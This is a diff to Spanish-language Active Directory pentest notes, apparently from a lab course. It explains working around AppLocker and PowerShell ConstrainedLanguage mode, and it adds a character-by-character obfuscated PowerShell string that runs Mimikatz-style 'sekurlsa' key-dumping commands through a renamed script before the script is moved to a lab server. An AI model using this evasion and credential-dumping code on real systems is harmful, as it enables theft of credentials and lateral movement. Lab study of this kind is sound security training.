@@ -575,6 +575,60 @@ Y enumerar las reglas de *AppLocker*
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
 
-Al utilizar un *ConstrainedLanguage*, no podremos usar scripts usando los puntos *. .\Invoke...*, asi que deberemos de modificar el script que vayamos a usar, en este xcaso *TheKat* para incluir la llamada de la funcion en el propio script, y despues transferir el script alñ servidor destino.
+Al utilizar un *ConstrainedLanguage*, no podremos usar scripts usando los puntos *. .\Invoke...*, asi que deberemos de modificar el script que vayamos a usar, en este xcaso *TheKat* para incluir la llamada de la funcion en el propio script, y despues transferir el script al servidor destino.
 
+Tendremos que crear una copia de *Invoke-TheKat.ps1* y cambiarle el nombre a *Invoke-TheJatEx-keys std97.ps1*, Abrimos con *PowerShell ISE*, y agregamos el sigueinte valor para *token-evasive-elevate* y *sekurlsa::evasive-ekeys* al final del archivo
 
+```shell
+$jq = "t";
+$hk = "o";
+$cr = "k";
+$dg = "e";
+$z3 = "n";
+$y4 = ":";
+$fq = ":";
+$67 = "e";
+$qj = "v";
+$27 = "a";
+$yt = "s";
+$ws = "i";
+$h4 = "v";
+$li = "e";
+$tv = "-";
+$2h = "e";
+$qx = "l";
+$lx = "e";
+$l1 = "v";
+$68 = "a";
+$5d = "t";
+$ny = "e";
+$25 = " ";
+$d9 = "s";
+$9z = "e";
+$8x = "k";
+$r2 = "u";
+$6x = "r";
+$zq = "l";
+$06 = "s";
+$td = "a";
+$hb = ":";
+$gz = ":";
+$nx = "e";
+$0n = "v";
+$qz = "a";
+$ct = "s";
+$mj = "i";
+$ue = "v";
+$sf = "e";
+$2c = "-";
+$9u = "e";
+$hp = "k";
+$x0 = "e";
+$yb = "y";
+$r1 = "s";
+$Pwn = $jq + $hk + $cr + $dg + $z3 + $y4 + $fq + $67 + $qj + $27 + $yt + $ws + $h4 + $li + $tv + $2h + $qx + $lx + $l1 + $68 + $5d + $ny + $25 + $d9 + $9z + $8x + $r2 + $6x + $zq + $06 + $td + $hb + $gz + $nx + $0n + $qz + $ct + $mj + $ue + $sf + $2c + $9u + $hp + $x0 + $yb + $r1 ;
+
+Invoke-TheKat -Command $Pwn
+```
+
+Ahora nos transferiremos el archivo a la maquina de *dcorp-adminsrv*
